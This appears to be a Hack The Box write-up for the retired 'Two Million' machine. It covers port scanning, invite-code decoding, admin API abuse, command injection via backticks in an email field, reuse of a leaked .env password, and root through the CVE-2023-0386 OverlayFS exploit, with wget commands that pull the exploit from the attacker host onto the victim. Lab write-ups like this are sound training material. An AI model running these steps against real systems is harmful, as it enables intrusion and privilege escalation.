@@ -1,0 +1,125 @@
+==============================================================================================
+					******** HTB - Machines_(Retired): Two Million ********
+===============================================================================================
+I started by running a full NMAP port scan to look for services running on the host with belwo cmd:
+
+** nmap -n -Pn --top-ports=2000 10.10.11.221 --reason --disable-arp-ping
+
+Nmap scan report for 10.10.11.221
+Host is up, received user-set (0.12s latency).
+Not shown: 1998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Then i did an nmap version scan of the services listening on the host with below command:
+
+** nmap -n -Pn -p22,80 -sC -sV 10.10.11.221 --disable-arp-ping
+
+Nmap scan report for 10.10.11.221
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Did not follow redirect to http://2million.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+=================================================================================================
+-- Host enumertion:
+===================
+OS: Linux
+Web app technology: PHP
+
+- cat .env:
+===========
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+
+=================================================================================================
+
+-- Exploitation walkthrough:
+============================
+On carrying out a directory file brute forcing via ffuf and wfuzz, I got nothing.
+
+On manual inspection, I noticed a 'invite' URL and on inspecting the page, I saw a minified JS fle.
+
+Using 'https://beautifier.io/' to deobfuscate it, I saw two functions, one to verify and another to
+make or generate an invite code.
+
+On manually going to the API endpoint for generating an invite code, i go a ROT13 response of the
+generated code.
+
+I then used 'https://rot13.com/' to decode the encoded string. In this string i was told the API end
+point to use to get an invite code whic are seen below:
+
+** /api/v1/invite/how/to/generate
+** /api/v1/invite/generate
+
+The code ws base64 encoded, so I had to base64 decode it from MjZUN1AtV1M2OUEtM05DUlUtVFdOVUo= to
+26T7P-WS69A-3NCRU-TWNUJ 
+
+I then used this invite code to login and I was directed to the user dashboard.
+
+On looking at the user dashboard, there was nothing interesting there so on inspecting the requests
+in burb, I noticed that a lot of API requets are being used in the app.
+
+On playing with the API requests, I could see the list of all API requests used by the app and in it
+i saw API requsts fr the admin.
+
+Part of the admin request allowed for elevatnig a user to admin and in the API endpoint for 
+generating a VPN file, I could get an injection vuln by specifing a bash command using ` in the 
+email param.
+
+** /api/v1/										List all API endpoints used by the app
+** /api/v1/admin/settings/update				Escalate user to admin
+** /api/v1/admin/vpn/generate					Injection point in email field e.g `whoami`
+
+From here, I create a rev shell to my kali machine and I was logged in as the www-data user.
+
+In order to read the user flag I needed to be the admin user.
+
+In the web root, I saw a .env file that contained user creds for the admin user to login to the DB
+on the host (mysql).
+
+Nothing interesting was found in the local DB. Then I tried a password reuse and swithed to the
+admin user via the 'su' command.
+
+And then i was able to read the user flag. While doing a post-exploitation, I could not get a path
+for privesc.
+
+On looking at the email sent to the admin user in the folder /var/mail/admin, i could see that there
+was an overlay vuln reportd in the mail.
+
+Googling for this vuln i came accross the CVE-2023-0386 exploit. Using the github repo:
+
+** https://github.com/xkaneiki/CVE-2023-0386/
+
+I clone the repo to my local machine, compressed it with zip, srved it locally on my kali host and
+downloaded it to the victim host via wget.
+
+Once on the victim host, I unziped and compiles the repo. Next I ran the first command in the 
+background and then the next one in the foreground.
+
+** git clone https://github.com/xkaneiki/CVE-2023-0386.git 
+** zip -r cve.zip CVE-2023-0386
+** python3 -m http.server 8008
+
+On victim machine:
+
+** wget http://10.10.14.5:8008/cve.zip
+** unzip cve.zip
+** cd CVE-2023-0386/
+** make all
+** ./fuse ./ovlcap/lower ./gc &
+** ./exp
+
+After running the above commands, I become root onnthe machine and then got the flag.
+
+
+
